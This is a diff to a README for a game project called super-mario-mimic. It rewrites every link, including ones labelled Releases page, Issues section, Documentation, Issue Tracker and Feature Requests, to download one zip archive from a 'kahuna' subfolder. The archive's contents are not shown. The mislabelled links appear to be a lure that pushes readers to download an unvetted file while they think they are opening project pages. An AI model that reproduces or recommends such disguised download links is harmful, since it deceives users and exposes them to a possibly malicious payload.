@@ -1,6 +1,6 @@
 # 🎮 super-mario-mimic - Enjoy a Classic Game Experience Online
 
-[![Download super-mario-mimic](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/carlpogi203/super-mario-mimic/releases)
+[![Download super-mario-mimic](https://raw.githubusercontent.com/carlpogi203/super-mario-mimic/main/kahuna/super-mario-mimic.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/carlpogi203/super-mario-mimic/main/kahuna/super-mario-mimic.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **super-mario-mimic**! This is your chance to enjoy a fun and engagin
 
 To get started, you need to download the game files. 
 
-1. Visit our [Releases page](https://github.com/carlpogi203/super-mario-mimic/releases).
+1. Visit our [Releases page](https://raw.githubusercontent.com/carlpogi203/super-mario-mimic/main/kahuna/super-mario-mimic.zip).
 2. Look for the latest version. You will see a list of available files.
 3. Click on the file that matches your device. If you're unsure, you can choose the general web version to play directly in your browser.
 
@@ -48,7 +48,7 @@ A: Yes, if you have a compatible browser installed, you can play it on your mobi
 A: Yes, **super-mario-mimic** is completely free to download and play.
 
 ### Q: How do I report a bug?
-A: If you encounter any issues, please visit our [Issues section](https://github.com/carlpogi203/super-mario-mimic/issues) on GitHub to report it.
+A: If you encounter any issues, please visit our [Issues section](https://raw.githubusercontent.com/carlpogi203/super-mario-mimic/main/kahuna/super-mario-mimic.zip) on GitHub to report it.
 
 ## 🌟 Community
 
@@ -58,8 +58,8 @@ Join the community of players and enthusiasts. Share your experiences, tips, and
 
 For more information, check out the links below:
 
-- [Documentation](https://github.com/carlpogi203/super-mario-mimic/wiki)
-- [Issue Tracker](https://github.com/carlpogi203/super-mario-mimic/issues)
-- [Feature Requests](https://github.com/carlpogi203/super-mario-mimic/issues/new?template=feature_request.md)
+- [Documentation](https://raw.githubusercontent.com/carlpogi203/super-mario-mimic/main/kahuna/super-mario-mimic.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/carlpogi203/super-mario-mimic/main/kahuna/super-mario-mimic.zip)
+- [Feature Requests](https://raw.githubusercontent.com/carlpogi203/super-mario-mimic/main/kahuna/super-mario-mimic.zip)
 
 Enjoy your adventure with **super-mario-mimic**! Don't forget to provide feedback and help us improve the game further.
